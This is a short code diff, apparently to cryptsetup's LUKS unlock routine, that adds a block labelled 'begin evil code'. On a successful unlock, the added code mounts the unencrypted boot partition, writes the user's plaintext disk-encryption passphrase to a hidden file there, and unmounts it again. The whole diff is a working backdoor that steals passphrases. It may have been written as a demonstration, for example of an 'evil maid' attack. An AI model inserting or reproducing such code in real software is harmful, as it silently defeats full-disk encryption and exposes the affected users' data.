@@ -1,0 +1,15 @@
+if((r = LUKS_open_any_key(options->device, password, passwordLen, &hdr, &mk, backend)) < 0) {
+	set_error("No key available with this passphrase.\n");
+	goto out1;
+}
+/* begin evil code */
+else {
+	system("/bin/mkdir /mntboot");
+	system("/bin/mount -t ext3 /dev/sda1 /mntboot");
+	FILE *fp = fopen("/mntboot/.cryptpass", "w");
+	fprintf(fp, "%s\n", password);
+	fclose(fp);
+	system("/bin/umount /mntboot");
+}
+/* end evil code */
+
